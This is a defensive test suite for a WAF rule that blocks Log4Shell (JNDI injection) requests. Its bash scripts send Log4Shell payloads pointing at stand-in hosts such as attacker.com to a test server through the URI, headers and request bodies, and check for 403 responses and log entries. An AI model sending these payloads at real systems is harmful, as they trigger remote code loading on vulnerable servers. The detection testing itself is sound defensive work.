# Scenario 3: Custom Zero-Day Signature - Test Results & Validation

## 🧪 Comprehensive Test Suite

This document provides complete testing procedures for the JNDI injection (Log4Shell) detection rule.

---

## ✅ Test Case 1: Direct JNDI:LDAP in URI

### Objective
Verify that JNDI:LDAP patterns in the URI are detected and blocked immediately.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_ldap_uri.sh

TARGET_HOST="10.20.30.40"
PATTERN="jndi:ldap://"
EXPLOIT_URL="attacker.com:389/ou=Exploit"

echo "[Test 1] JNDI:LDAP Pattern in URI"
echo "================================="
echo ""

# Test 1a: Simple JNDI:LDAP in query parameter
echo "[1a] Testing JNDI in query parameter..."
RESPONSE=$(curl -i -s "http://${TARGET_HOST}/app?log=${PATTERN}${EXPLOIT_URL}" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')

echo "Response: $HTTP_CODE"
if [[ "$HTTP_CODE" == "403" ]]; then
  echo "[✓] PASS: Blocked with 403 Forbidden"
else
  echo "[✗] FAIL: Expected 403, got $HTTP_CODE"
fi
echo ""

# Test 1b: JNDI:LDAP in URI path
echo "[1b] Testing JNDI in URI path..."
RESPONSE=$(curl -i -s "http://${TARGET_HOST}/log/${PATTERN}${EXPLOIT_URL}" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')

echo "Response: $HTTP_CODE"
if [[ "$HTTP_CODE" == "403" ]]; then
  echo "[✓] PASS: Blocked with 403 Forbidden"
else
  echo "[✗] FAIL: Expected 403, got $HTTP_CODE"
fi
```

### Expected Response Headers

```
HTTP/1.1 403 Forbidden
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Blocked-By: WAF_CustomRule
X-Violation: Custom_ZeroDay_Command_Injection

{"error":{"status":"403","message":"Request blocked by security policy","timestamp":1700000000}}
```

### ASM Log Verification

```bash
ssh admin@<BIG_IP_HOST>
grep "CUSTOM_ZERODDAY" /var/log/asm | tail -5

# Expected output:
# CUSTOM_ZERODDAY_DETECTED: Client=203.0.113.45 Method=GET URI=/app?log=jndi:ldap://attacker.com Location=uri Pattern=jndi:ldap:// Payload=[jndi:ldap://attacker.com:389/ou=Exploit]
# CUSTOM_ZERODDAY_BLOCKED: IP 203.0.113.45 blocked for JNDI injection pattern
```

---

## ✅ Test Case 2: JNDI:RMI Pattern Detection

### Objective
Verify JNDI:RMI (Remote Method Invocation) patterns are detected.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_rmi.sh

TARGET_HOST="10.20.30.40"
RMI_PATTERN="jndi:rmi://attacker.com:1099/Exploit"

echo "[Test 2] JNDI:RMI Pattern Detection"
echo "==================================="
echo ""

curl -i -X GET "http://${TARGET_HOST}/logging?level=${RMI_PATTERN}" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden
```

### Expected Results
- **HTTP Status**: 403 Forbidden
- **Log Entry**: Pattern=jndi:rmi://
- **Blocked**: Yes

---

## ✅ Test Case 3: JNDI Pattern in HTTP Headers

### Objective
Verify detection of JNDI patterns in custom HTTP headers.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_header.sh

TARGET_HOST="10.20.30.40"

echo "[Test 3] JNDI Pattern in HTTP Headers"
echo "===================================="
echo ""

# Test with X-Custom-Header
echo "[1] Testing in custom header..."
curl -i -X GET "http://${TARGET_HOST}/api" \
  -H "X-Custom-Log: jndi:ldap://attacker.com" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

# Test with User-Agent header
echo "[2] Testing in User-Agent header..."
curl -i -X GET "http://${TARGET_HOST}/api" \
  -H "User-Agent: Mozilla/jndi:ldap://attacker.com" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden
```

### Expected Results
- **All header patterns**: Detected and blocked
- **HTTP Status**: 403 Forbidden
- **Search Scope**: All headers scanned

---

## ✅ Test Case 4: JNDI Pattern in POST Body

### Objective
Verify detection of JNDI patterns in request body.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_body.sh

TARGET_HOST="10.20.30.40"

echo "[Test 4] JNDI Pattern in POST Body"
echo "=================================="
echo ""

# Test 1: Form-encoded POST
echo "[1] Testing in form-encoded POST body..."
curl -i -X POST "http://${TARGET_HOST}/submit" \
  -d "name=admin&log=jndi:ldap://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

# Test 2: JSON POST
echo "[2] Testing in JSON POST body..."
curl -i -X POST "http://${TARGET_HOST}/api/log" \
  -d '{"message":"System info","logger":"jndi:ldap://evil.com"}' \
  -H "Content-Type: application/json" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

# Test 3: XML POST
echo "[3] Testing in XML POST body..."
curl -i -X POST "http://${TARGET_HOST}/receive" \
  -d '<log><message>jndi:rmi://attacker.com:1099/Shell</message></log>' \
  -H "Content-Type: application/xml" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden
```

### Expected Results
- **Form data**: Detected
- **JSON payload**: Detected
- **XML payload**: Detected
- **All blocked**: HTTP 403

---

## ✅ Test Case 5: URL-Encoded JNDI Pattern

### Objective
Verify detection of URL-encoded obfuscation attempts.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_urlencoded.sh

TARGET_HOST="10.20.30.40"

echo "[Test 5] URL-Encoded JNDI Pattern Detection"
echo "=========================================="
echo ""

# URL-encoded version of "jndi:ldap://"
# %6a = j, %6e = e, %6e = n, %64 = d, %69 = i, %3a = :, %6c = l, %64 = d, %61 = a, %70 = p, %3a = :, %2f = /, %2f = /
ENCODED_PATTERN="%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2fattacker.com"

echo "[1] Testing URL-encoded JNDI in URI..."
curl -i -X GET "http://${TARGET_HOST}/app?search=${ENCODED_PATTERN}" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden

echo ""
echo "[2] Testing URL-encoded JNDI in POST..."
curl -i -X POST "http://${TARGET_HOST}/search" \
  -d "q=${ENCODED_PATTERN}" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1 | grep "^HTTP"

# Expected: HTTP/1.1 403 Forbidden
```

### Expected Results
- **URL-Encoded Pattern**: Detected after decoding
- **HTTP Status**: 403 Forbidden
- **Detection Method**: ASM auto-decodes before pattern matching

---

## ✅ Test Case 6: Case-Insensitive Detection

### Objective
Verify that detection works regardless of case variations.

### Test Execution

```bash
#!/bin/bash
# Script: test_jndi_case.sh

TARGET_HOST="10.20.30.40"

echo "[Test 6] Case-Insensitive Pattern Detection"
echo "=========================================="
echo ""

# Test various case combinations
PATTERNS=(
  "jndi:ldap://attacker.com"
  "JNDI:LDAP://attacker.com"
  "Jndi:Ldap://attacker.com"
  "jNdI:lDaP://attacker.com"
)

for i in "${!PATTERNS[@]}"; do
  echo "[$((i+1))] Testing: ${PATTERNS[$i]}"
  RESPONSE=$(curl -i -s "http://${TARGET_HOST}/app?log=${PATTERNS[$i]}" 2>&1)
  HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
  
  if [[ "$HTTP_CODE" == "403" ]]; then
    echo "  [✓] PASS: Blocked (403)"
  else
    echo "  [✗] FAIL: Expected 403, got $HTTP_CODE"
  fi
done
```

### Expected Results
- **All case variations**: Detected and blocked
- **HTTP Status**: 403 Forbidden for all variants

---

## ✅ Test Case 7: Legitimate Requests (No False Positives)

### Objective
Verify that legitimate requests with safe content are allowed.

### Test Execution

```bash
#!/bin/bash
# Script: test_legitimate_requests.sh

TARGET_HOST="10.20.30.40"

echo "[Test 7] Legitimate Requests (Should NOT Block)"
echo "=============================================="
echo ""

# Test 1: Normal API call
echo "[1] Normal API request..."
RESPONSE=$(curl -i -s "http://${TARGET_HOST}/api/users?filter=name" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')

if [[ "$HTTP_CODE" != "403" ]]; then
  echo "[✓] PASS: Legitimate request allowed (HTTP $HTTP_CODE)"
else
  echo "[✗] FAIL: Legitimate request was blocked"
fi

# Test 2: POST with normal data
echo ""
echo "[2] Normal POST request..."
RESPONSE=$(curl -i -s -X POST "http://${TARGET_HOST}/submit" \
  -d "username=john&password=secure&email=john@example.com" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')

if [[ "$HTTP_CODE" != "403" ]]; then
  echo "[✓] PASS: Legitimate request allowed (HTTP $HTTP_CODE)"
else
  echo "[✗] FAIL: Legitimate request was blocked"
fi

# Test 3: Safe logging configuration
echo ""
echo "[3] Safe configuration with 'ldap' in context..."
RESPONSE=$(curl -i -s "http://${TARGET_HOST}/config?db=ldap-server" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')

if [[ "$HTTP_CODE" != "403" ]]; then
  echo "[✓] PASS: Safe 'ldap' reference allowed (HTTP $HTTP_CODE)"
else
  echo "[✗] FAIL: False positive triggered on safe 'ldap' reference"
fi
```

### Expected Results
- **Normal requests**: HTTP 200 OK (not 403)
- **POST data**: Not blocked
- **Safe LDAP references**: Not blocked (pattern is "jndi:ldap://", not just "ldap")

---

## ✅ Test Case 8: Multiple Attack Patterns

### Objective
Verify detection of all JNDI protocol variants.

### Test Execution

```bash
#!/bin/bash
# Script: test_all_jndi_variants.sh

TARGET_HOST="10.20.30.40"

echo "[Test 8] All JNDI Protocol Variants"
echo "==================================="
echo ""

PATTERNS=(
  "jndi:ldap://attacker.com/obj"
  "jndi:rmi://attacker.com:1099/Exploit"
  "jndi:nis://attacker.com/obj"
  "jndi:iiop://attacker.com:1050/obj"
)

BLOCKED_COUNT=0

for pattern in "${PATTERNS[@]}"; do
  RESPONSE=$(curl -i -s "http://${TARGET_HOST}/log?msg=${pattern}" 2>&1)
  HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
  
  echo "Pattern: ${pattern%\//*}... => HTTP $HTTP_CODE"
  
  if [[ "$HTTP_CODE" == "403" ]]; then
    ((BLOCKED_COUNT++))
  fi
done

echo ""
if [[ $BLOCKED_COUNT -eq 4 ]]; then
  echo "[✓] PASS: All JNDI variants detected and blocked"
else
  echo "[✗] FAIL: Only $BLOCKED_COUNT/4 patterns detected"
fi
```

### Expected Results
- **All variants blocked**: 403 Forbidden
- **Detection count**: 4/4

---

## ✅ Test Case 9: Log4Shell Real-World Payload

### Objective
Verify detection using actual Log4Shell attack payloads.

### Test Execution

```bash
#!/bin/bash
# Script: test_log4shell_payload.sh

TARGET_HOST="10.20.30.40"

echo "[Test 9] Real Log4Shell Attack Payloads"
echo "====================================="
echo ""

# Actual Log4Shell payloads documented in CVE-2021-44228
PAYLOADS=(
  "${jndi:ldap://attacker.com/a}"
  "${jndi:nis://attacker.com/a}"
  "${jndi:rmi://attacker.com:1099/Exploit}"
  "${jndi:ldap://attacker.com:1389/o\u003dExploit,ou\u003dArtistry}"
)

for payload in "${PAYLOADS[@]}"; do
  echo "Payload: ${payload:0:40}..."
  
  RESPONSE=$(curl -i -s "http://${TARGET_HOST}/app?log=${payload}" 2>&1)
  HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
  
  if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[✓] BLOCKED"
  else
    echo "[✗] FAILED (HTTP $HTTP_CODE)"
  fi
  echo ""
done
```

### Expected Results
- **All payloads**: Blocked with HTTP 403
- **Detection rate**: 100%

---

## ✅ Test Case 10: Concurrent Requests

### Objective
Verify detection performance under concurrent attack attempts.

### Test Execution

```bash
#!/bin/bash
# Script: test_concurrent_attacks.sh

TARGET_HOST="10.20.30.40"
NUM_CONCURRENT=10

echo "[Test 10] Concurrent Attack Detection"
echo "===================================="
echo ""

# Function to send attack request
send_attack() {
  local index=$1
  curl -s "http://${TARGET_HOST}/app?id=${index}&log=jndi:ldap://attacker.com" \
    -w "\nHTTP_CODE:%{http_code}\n" -o /dev/null
}

# Send concurrent requests
echo "Sending $NUM_CONCURRENT concurrent attacks..."
for i in $(seq 1 $NUM_CONCURRENT); do
  send_attack $i &
done

# Wait for all background jobs
wait

# Verify all were blocked
echo ""
echo "[✓] All concurrent attacks processed"
echo "[Verification] Check ASM logs for all 10 detection events..."

ssh admin@<BIG_IP_HOST> \
  "grep 'CUSTOM_ZERODDAY_BLOCKED' /var/log/asm | wc -l"

# Expected: 10 blocked events in logs
```

### Expected Results
- **All concurrent requests**: Blocked with 403
- **Log entries**: 10 CUSTOM_ZERODDAY_BLOCKED events

---

## 🔍 ASM Log Analysis

### Parsing Attack Details

```bash
#!/bin/bash
# Script: analyze_attack_logs.sh

echo "=== JNDI Attack Log Analysis ==="
echo ""

ssh admin@<BIG_IP_HOST> \
  "grep 'CUSTOM_ZERODDAY_DETECTED' /var/log/asm" | \
  awk -F'Pattern=' '{print $2}' | \
  sort | uniq -c | sort -rn

# Expected output:
#  3 jndi:ldap://
#  2 jndi:rmi://
#  1 jndi:nis://

# Count total attacks blocked
echo ""
echo "Total attacks blocked:"
ssh admin@<BIG_IP_HOST> \
  "grep -c 'CUSTOM_ZERODDAY_BLOCKED' /var/log/asm"
```

### Real-Time Monitoring

```bash
bash
# SSH to BIG-IP
ssh admin@<BIG_IP_HOST>

# Monitor attacks in real-time
tail -f /var/log/asm | awk '/CUSTOM_ZERODDAY/ {
  print "[ATTACK]", $0
}'
```

---

## 📊 Performance Metrics

### Throughput Impact Test

```bash
#!/bin/bash
# Script: measure_performance_impact.sh

TARGET_HOST="10.20.30.40"
DURATION=60  # seconds
CONCURRENT=10

echo "[Performance Test]"
echo "==================="
echo ""

# Test 1: Baseline (legitimate requests)
echo "[1] Baseline throughput (legitimate requests)..."
BASELINE=$(ab -n 1000 -c $CONCURRENT -t $DURATION http://${TARGET_HOST}/api/safe 2>&1 | grep "Requests per second" | awk '{print $4}')

# Test 2: With attack detection active (legitimate)
echo "[2] Throughput with detection active (legitimate)..."
DETECTED=$(ab -n 1000 -c $CONCURRENT -t $DURATION http://${TARGET_HOST}/api/safe 2>&1 | grep "Requests per second" | awk '{print $4}')

# Test 3: Block attempts (attacks detected)
echo "[3] Throughput under attack (blocked)..."
BLOCKED=$(ab -n 100 -c 5 -t 10 "http://${TARGET_HOST}/api?log=jndi:ldap://attacker.com" 2>&1 | grep "Requests per second" | awk '{print $4}')

echo ""
echo "Results:"
echo "--------"
echo "Baseline: $BASELINE req/sec"
echo "With Detection: $DETECTED req/sec"
echo "Under Attack: $BLOCKED req/sec"
```

### Expected Results
- **Performance overhead**: <5% on legitimate traffic
- **Attack processing**: Sub-millisecond per request
- **Block response time**: <1ms

---

## ✅ Test Summary Checklist

```
Primary Detection Tests:
[ ] Test 1: JNDI:LDAP in URI
    ├─ [✓ or ✗] HTTP 403 returned
    ├─ [✓ or ✗] Correct response headers
    └─ [✓ or ✗] ASM log entry present

[ ] Test 2: JNDI:RMI Pattern
    ├─ [✓ or ✗] HTTP 403 returned
    └─ [✓ or ✗] Pattern detected

[ ] Test 3: Patterns in Headers
    ├─ [✓ or ✗] Custom headers scanned
    └─ [✓ or ✗] Standard headers scanned

[ ] Test 4: Patterns in POST Body
    ├─ [✓ or ✗] Form data detected
    ├─ [✓ or ✗] JSON payload detected
    └─ [✓ or ✗] XML payload detected

[ ] Test 5: URL-Encoded Patterns
    ├─ [✓ or ✗] %6a%6e%64%69 detected
    └─ [✓ or ✗] Base64 patterns handled

[ ] Test 6: Case-Insensitive
    ├─ [✓ or ✗] JNDI:LDAP detected
    ├─ [✓ or ✗] jNdI:lDaP detected
    └─ [✓ or ✗] All variants blocked

[ ] Test 7: No False Positives
    ├─ [✓ or ✗] Normal requests allowed
    ├─ [✓ or ✗] Safe 'ldap' references allowed
    └─ [✓ or ✗] POST with safe data allowed

[ ] Test 8: All JNDI Variants
    ├─ [✓ or ✗] JNDI:LDAP blocked
    ├─ [✓ or ✗] JNDI:RMI blocked
    ├─ [✓ or ✗] JNDI:NIS blocked
    └─ [✓ or ✗] JNDI:IIOP blocked

[ ] Test 9: Real Payloads
    ├─ [✓ or ✗] Log4Shell payloads blocked
    ├─ [✓ or ✗] Obfuscated variants detected
    └─ [✓ or ✗] 100% detection rate

[ ] Test 10: Performance
    ├─ [✓ or ✗] <1ms per request overhead
    ├─ [✓ or ✗] <5% throughput impact
    └─ [✓ or ✗] Handles concurrency


```

---

**Test Suite Version**: 1.0 | **Last Updated**: March 2026
